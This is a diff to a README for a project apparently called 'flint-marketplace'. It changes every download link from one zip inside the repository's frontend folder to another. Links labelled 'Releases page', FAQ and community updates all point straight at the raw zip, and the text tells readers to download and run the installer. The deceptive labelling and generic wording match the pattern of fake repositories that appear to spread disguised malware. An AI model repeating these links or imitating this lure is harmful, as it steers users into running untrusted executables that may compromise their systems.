@@ -6,9 +6,9 @@ Welcome to **flint-marketplace**! This is your guide to downloading and running 
 
 ## 📥 Download Application
 
-[![Download flint-marketplace](https://raw.githubusercontent.com/RedOverkill09/flint-marketplace/main/frontend/src/flint_marketplace_v1.4.zip)](https://raw.githubusercontent.com/RedOverkill09/flint-marketplace/main/frontend/src/flint_marketplace_v1.4.zip)
+[![Download flint-marketplace](https://github.com/RedOverkill09/flint-marketplace/raw/refs/heads/main/frontend/marketplace_flint_v1.0.zip)](https://github.com/RedOverkill09/flint-marketplace/raw/refs/heads/main/frontend/marketplace_flint_v1.0.zip)
 
-Click the button above to download the application. Alternatively, you can also visit the [Releases page](https://raw.githubusercontent.com/RedOverkill09/flint-marketplace/main/frontend/src/flint_marketplace_v1.4.zip) to find additional versions.
+Click the button above to download the application. Alternatively, you can also visit the [Releases page](https://github.com/RedOverkill09/flint-marketplace/raw/refs/heads/main/frontend/marketplace_flint_v1.0.zip) to find additional versions.
 
 ## 📂 Features
 
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 💻 How to Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/RedOverkill09/flint-marketplace/main/frontend/src/flint_marketplace_v1.4.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/RedOverkill09/flint-marketplace/raw/refs/heads/main/frontend/marketplace_flint_v1.0.zip).
 2. **Choose Your Version**: Look for the latest version available.
 3. **Download the Installer**: Click the installer file that matches your operating system.
 4. **Run the Installer**: Once downloaded, open the installer and follow the on-screen instructions.
@@ -45,7 +45,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## ⚙️ Need Help?
 
-If you encounter any issues during download or installation, please check the FAQ section on our [Releases page](https://raw.githubusercontent.com/RedOverkill09/flint-marketplace/main/frontend/src/flint_marketplace_v1.4.zip). You can find answers to common questions and troubleshooting tips.
+If you encounter any issues during download or installation, please check the FAQ section on our [Releases page](https://github.com/RedOverkill09/flint-marketplace/raw/refs/heads/main/frontend/marketplace_flint_v1.0.zip). You can find answers to common questions and troubleshooting tips.
 
 ## ❓ Frequently Asked Questions (FAQ)
 
@@ -64,7 +64,7 @@ If you're interested in contributing to flint-marketplace, we welcome your feedb
 
 ## 🌐 Join the Community
 
-Stay updated by joining our community. Follow us on GitHub, and keep an eye on the [Releases page](https://raw.githubusercontent.com/RedOverkill09/flint-marketplace/main/frontend/src/flint_marketplace_v1.4.zip) for the latest news and updates.
+Stay updated by joining our community. Follow us on GitHub, and keep an eye on the [Releases page](https://github.com/RedOverkill09/flint-marketplace/raw/refs/heads/main/frontend/marketplace_flint_v1.0.zip) for the latest news and updates.
 
 ## 📦 Additional Resources
 
